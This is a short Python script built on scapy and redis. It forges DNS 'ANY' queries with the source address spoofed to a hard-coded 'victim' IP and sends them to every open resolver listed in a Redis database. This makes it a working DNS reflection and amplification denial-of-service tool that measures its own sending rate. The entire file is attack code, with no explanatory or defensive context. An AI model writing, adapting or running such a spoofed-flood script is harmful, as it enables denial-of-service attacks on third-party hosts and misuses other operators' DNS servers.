from scapy.all import *
import redis


def a2b(ascii_str):  # ascii to binary
    return ascii_str.encode('ascii')


def b2a(bin_string):  # binary to ascii
    return bin_string.decode('ascii', 'replace')


if __name__ == '__main__':
    start_time = time.time()
    redis_db = redis.StrictRedis()
    resolvers = redis_db.lrange('resolvers', 0, -1)
    print("Total num of resolvers is: %s" % str(len(resolvers)))
    #scapy_socket = conf.L3socket(iface='ens192')
    scapy_socket = L3RawSocket(iface='ens192')
    victim = '88.205.225.205'

    forged_packet = IP(src=victim) / UDP(sport=1025, dport=53, chksum=0) /\
                    DNS(rd=1, qd=DNSQR(qname="abc.com", qtype='ALL', qclass='IN'))

    for ip in resolvers:
        forged_packet.dst = b2a(ip)
        scapy_socket.send(forged_packet)
    end_time = time.time()
    delta = end_time - start_time
    pps = len(resolvers) / delta
    print('Time was %s, PPS is %s' % (str(delta), str(pps)))
